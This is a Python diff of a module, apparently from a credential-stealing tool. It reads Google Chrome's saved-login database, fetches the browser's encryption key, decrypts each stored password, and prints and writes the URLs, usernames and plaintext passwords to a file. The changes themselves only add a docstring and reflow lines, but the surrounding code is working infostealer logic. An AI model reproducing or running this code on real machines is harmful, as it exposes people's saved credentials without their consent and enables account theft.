@@ -3,8 +3,14 @@ import sqlite3
 import shutil
 from .chrome_password import ChromePassword
 
+
 class Password:
     def main(self, user_type):
+        """[it will collect user data from logins table that chrome created and store the result in file]
+
+        Args:
+            user_type ([String]): [the user type that we need to take the pasword from]
+        """
         chrome_password: ChromePassword = ChromePassword()
         key = chrome_password.fetching_encryption_key()
         db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
@@ -27,7 +33,8 @@ class Password:
             main_url = row[0]
             login_page_url = row[1]
             user_name = row[2]
-            decrypted_password = chrome_password.password_decryption(row[3], key)
+            decrypted_password = chrome_password.password_decryption(
+                row[3], key)
             date_of_creation = row[4]
             last_usuage = row[5]
 
@@ -41,10 +48,12 @@ class Password:
                 continue
 
             if date_of_creation != 86400000000 and date_of_creation:
-                print(f"Creation date: {str(chrome_password.chrome_date_and_time(date_of_creation))}")
+                print(
+                    f"Creation date: {str(chrome_password.chrome_date_and_time(date_of_creation))}")
 
             if last_usuage != 86400000000 and last_usuage:
-                print(f"Last Used: {str(chrome_password.chrome_date_and_time(last_usuage))}")
+                print(
+                    f"Last Used: {str(chrome_password.chrome_date_and_time(last_usuage))}")
             print("=" * 100)
         file.close()
         cursor.close()
